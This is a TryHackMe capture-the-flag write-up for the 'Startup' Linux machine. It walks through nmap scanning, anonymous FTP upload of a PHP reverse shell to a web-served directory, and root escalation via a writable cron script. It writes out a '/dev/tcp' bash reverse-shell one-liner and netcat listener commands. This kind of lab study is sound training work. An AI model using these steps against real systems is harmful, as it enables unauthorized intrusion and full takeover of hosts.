# 🚀 Startup - TryHackMe

## 📌 Information

| Field          | Value                                                       |
| -------------- | ----------------------------------------------------------- |
| **Machine**    | Startup                                                     |
| **Platform**   | TryHackMe                                                   |
| **Difficulty** | Easy                                                        |
| **OS**         | Linux                                                       |
| **Category**   | Enumeration / FTP / Web Exploitation / Privilege Escalation |

---

# 🎯 Objective

Gain access to the Linux machine, obtain a reverse shell, and escalate privileges to root in order to retrieve the flags.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash id="2x7x3s"
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version            |
| ---- | ------- | ------------------ |
| 21   | FTP     | vsftpd             |
| 22   | SSH     | OpenSSH            |
| 80   | HTTP    | Apache HTTP Server |

### Notes

* FTP was exposed and allowed anonymous access.
* A web server was running on port 80.
* SSH was available but required credentials.

---

# 🔍 Enumeration

## FTP Enumeration

Check anonymous login:

```bash id="5f5m9m"
ftp MACHINE_IP
```

Login:

```text
Username: anonymous
Password: anonymous
```

### Findings

A writable directory was discovered:

```text id="2qcx2w"
ftp/
```

Files uploaded to this directory were accessible through the web server.

---

## Web Enumeration

Directory brute force:

```bash id="u4t4av"
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting directory:

```text id="2z8z1p"
/files
```

The FTP files were exposed through this directory.

---

# 💥 Exploitation

Since the FTP directory was writable and accessible from the web server, a PHP reverse shell was uploaded.

Create a payload:

```bash id="5l6j7a"
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Modify the listener IP and port:

```php id="6jd7uo"
$ip = 'YOUR_IP';
$port = 4444;
```

Upload the file:

```bash id="5jczr4"
ftp MACHINE_IP
put shell.php
```

Start Netcat listener:

```bash id="7a9z0h"
nc -lvnp 4444
```

Access the uploaded file:

```text id="pj6q1g"
http://MACHINE_IP/files/shell.php
```

### Result

A reverse shell was obtained.

Check current user:

```bash id="j5z3xm"
whoami
```

Output:

```text id="7b7q4d"
www-data
```

---

# ⬆️ Privilege Escalation

## Enumeration

Search for interesting files:

```bash id="93m8kq"
find / -type f -name "*.txt" 2>/dev/null
```

A suspicious file was discovered:

```text id="0ojl8g"
/home/lennie/scripts/planner.sh
```

Inspect permissions:

```bash id="3zj7u5"
ls -la /home/lennie/scripts/
```

The script was executed periodically by another user and could be modified.

---

## Exploiting Cron Job

The vulnerable script was modified to execute a reverse shell.

Example payload:

```bash id="j0l8l5"
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

Start listener:

```bash id="s5k5mw"
nc -lvnp 4444
```

After the scheduled task executed, a new shell was received.

Verify privileges:

```bash id="0g6u1m"
whoami
```

Output:

```text id="xq2gq8"
root
```

---

# 🚩 Flags

## User Flag

```text id="6c8d0y"
<user_flag>
```

## Root Flag

```text id="m0x2q1"
<root_flag>
```

---

# 📚 What I Learned

* Enumerating FTP services.
* Exploiting anonymous FTP access.
* Uploading files to a web-accessible directory.
* Obtaining reverse shells.
* Linux file permission enumeration.
* Exploiting insecure cron jobs for privilege escalation.

---

# 🛠️ Tools Used

* Nmap
* FTP
* Gobuster
* Netcat
* PHP Reverse Shell
* Linux CLI

---

# 📖 MITRE ATT&CK

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1133     | External Remote Services          |
| T1190     | Exploit Public-Facing Application |
| T1505.003 | Web Shell                         |
| T1053.003 | Cron Job / Scheduled Task         |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Anonymous FTP login
* FTP directory listing
* Gobuster results
* Reverse shell connection
* User enumeration
* Cron job discovery
* Root shell
* Flags

---

# ✅ Summary

Startup is a beginner Linux machine focused on the importance of proper service enumeration and misconfiguration discovery. The machine demonstrates how anonymous FTP access can lead to web shell upload, how to obtain an initial foothold through a reverse shell, and how insecure scheduled tasks can be abused to achieve **root** privileges.
